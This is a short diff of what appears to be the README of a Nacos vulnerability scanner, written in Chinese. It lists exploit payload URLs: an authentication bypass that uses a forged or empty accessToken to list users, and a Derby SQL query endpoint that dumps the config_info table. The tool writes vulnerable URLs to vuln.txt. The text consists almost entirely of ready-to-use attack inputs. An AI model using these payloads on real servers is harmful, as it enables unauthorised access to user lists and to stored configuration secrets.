@@ -15,7 +15,9 @@ payload1:http://xxx.com/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJ
 payload2:http://xxx.com/nacos/v1/auth/users?accessToken=&pageNo=1&pageSize=9
 
 23年9月15日更新
+
 增加sql注入扫描
+
 payload4:nacos/v1/cs/ops/derby?sql=select * from config_info
 
 扫描结束后会在当前目录生成存在漏洞url的vuln.txt
